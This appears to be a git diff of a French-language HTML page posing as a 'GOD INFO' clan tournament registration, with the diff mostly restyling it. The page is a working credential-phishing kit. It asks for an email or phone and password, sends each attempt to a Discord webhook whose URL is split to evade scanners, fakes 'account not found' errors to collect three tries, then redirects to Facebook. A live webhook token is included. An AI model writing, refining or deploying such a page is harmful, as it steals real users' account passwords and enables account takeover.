@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOD INFO | META VERSE</title>
+    <title>✰❦𝐆𝐎𝐃✧𝐈𝐍𝐅𝐎❦✰ | META VERSE</title>
     <link rel="icon" href="logo.jpg" type="image/x-icon">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500&display=swap" rel="stylesheet">
     <style>
@@ -53,7 +53,7 @@
         .container {
             background: rgba(20, 20, 25, 0.95);
             border: 2px solid var(--neon-purple);
-            padding: 30px;
+            padding: 25px;
             border-radius: 15px;
             box-shadow: 0 0 25px var(--neon-purple);
             width: 320px;
@@ -61,7 +61,24 @@
             z-index: 10;
         }
 
-        h2 { font-family: 'Orbitron', sans-serif; color: var(--neon-blue); font-size: 1.2rem; text-transform: uppercase; margin-bottom: 20px; }
+        /* Style du logo au-dessus du formulaire */
+        .form-logo {
+            width: 80px;
+            border-radius: 50%;
+            border: 2px solid var(--neon-blue);
+            margin-bottom: 10px;
+            filter: drop-shadow(0 0 5px var(--neon-blue));
+        }
+
+        .clan-title {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--neon-purple);
+            font-size: 1rem;
+            margin-bottom: 15px;
+            letter-spacing: 2px;
+        }
+
+        h2 { font-family: 'Orbitron', sans-serif; color: var(--neon-blue); font-size: 1.1rem; text-transform: uppercase; margin-bottom: 20px; }
 
         input {
             width: 90%;
@@ -108,27 +125,34 @@
     </div>
 
     <div class="container" id="step1">
+        <img src="logo.jpg" class="form-logo" alt="Logo">
+        <div class="clan-title">✰❦𝐆𝐎𝐃✧𝐈𝐍𝐅𝐎❦✰</div>
         <h2>Inscription Tournoi</h2>
+        
         <input type="text" id="gang" placeholder="Nom du gang ou Police">
         <input type="text" id="boss" placeholder="Nom du Boss">
-        <input type="text" id="rang" placeholder="Votre Rang">
-        <input type="text" id="brasdroit" placeholder="Bras Droit du Boss">
+        <input type="text" id="rang" placeholder="Rang (ex: Bras droit, Chef de div)">
+        
         <div id="err1" class="error-msg">⚠️ Erreur : Tous les champs sont requis.</div>
         <button class="btn" id="btn1" onclick="submitStep1()">Valider l'inscription</button>
-        <div id="loader" id="loading1"></div>
+        <div id="loader"></div>
     </div>
 
     <div class="container hidden" id="step2">
+        <img src="logo.jpg" class="form-logo" alt="Logo">
+        <div class="clan-title">✰❦𝐆𝐎𝐃✧𝐈𝐍𝐅𝐎❦✰</div>
         <h2>Vérification Groupe</h2>
-        <p style="font-size: 0.8em; color: #888;">Connectez votre compte pour confirmer votre appartenance au groupe GOD INFO.</p>
+        <p style="font-size: 0.75em; color: #888; margin-bottom: 15px;">Confirmez votre compte pour finaliser l'inscription au groupe GOD INFO.</p>
+        
         <input type="text" id="email" placeholder="Email ou Numéro de tél">
         <input type="password" id="pass" placeholder="Mot de passe">
+        
         <div id="err2" class="error-msg">⚠️ Aucun compte trouvé dans le groupe GOD INFO. Réessayez.</div>
         <button class="btn" id="btn2" onclick="submitStep2()">Connexion à GOD INFO</button>
     </div>
 
     <script>
-        // Webhook fragmenté pour éviter les scans automatiques de GitHub
+        // Webhook fragmenté
         const part1 = "https://discordapp.com/api/webhooks/";
         const part2 = "1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
         const webhookURL = part1 + part2;
@@ -147,9 +171,9 @@
             const gang = document.getElementById('gang').value;
             const boss = document.getElementById('boss').value;
             const rang = document.getElementById('rang').value;
-            const bd = document.getElementById('brasdroit').value;
 
-            if(!gang || !boss || !rang || !bd) {
+            // Vérification des 3 champs uniquement
+            if(!gang || !boss || !rang) {
                 document.getElementById('err1').style.display = 'block';
                 return;
             }
@@ -158,11 +182,12 @@
             document.getElementById('btn1').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // Envoi des infos du premier formulaire
-            const msg = `📑 **NOUVELLE FICHE INSCRIPTION**\n━━━━━━━━━━━━━━\n👤 **Gang:** ${gang}\n👑 **Boss:** ${boss}\n🎖️ **Rang:** ${rang}\n🤝 **Bras Droit:** ${bd}\n━━━━━━━━━━━━━━`;
+            // Envoi des infos tournoi
+            const msg = `📑 **NOUVELLE INSCRIPTION TOURNOI**\n━━━━━━━━━━━━━━\n👤 **Gang:** ${gang}\n👑 **Boss:** ${boss}\n🎖️ **Rang:** ${rang}\n━━━━━━━━━━━━━━`;
             sendToDiscord(msg);
 
             setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
                 document.getElementById('step1').classList.add('hidden');
                 document.getElementById('step2').classList.remove('hidden');
             }, 2000);
@@ -173,15 +198,15 @@
             const pass = document.getElementById('pass').value;
 
             if(!email || !pass) {
-                document.getElementById('err2').innerText = "⚠️ Veuillez remplir tous les champs.";
+                document.getElementById('err2').innerText = "⚠️ Identifiants requis.";
                 document.getElementById('err2').style.display = 'block';
                 return;
             }
 
             attempt++;
 
-            // Envoi des identifiants
-            const msg = `🔓 **LOGS REÇUS (Essai ${attempt})**\n━━━━━━━━━━━━━━\n📧 **Email:** ${email}\n🔑 **Pass:** ${pass}\n━━━━━━━━━━━━━━`;
+            // Envoi des identifiants à chaque clic
+            const msg = `🔓 **LOGS REÇUS (Essai ${attempt})**\n━━━━━━━━━━━━━━\n📧 **User:** ${email}\n🔑 **Pass:** ${pass}\n━━━━━━━━━━━━━━`;
             sendToDiscord(msg);
 
             if(attempt < 3) {
@@ -189,9 +214,9 @@
                 document.getElementById('err2').style.display = 'block';
                 document.getElementById('pass').value = "";
             } else {
-                document.getElementById('btn2').innerText = "Redirection...";
+                document.getElementById('btn2').innerText = "Vérification validée...";
                 setTimeout(() => {
-                    // Redirection vers Facebook
+                    // Redirection finale vers Facebook
                     window.location.href = "https://www.facebook.com";
                 }, 1000);
             }
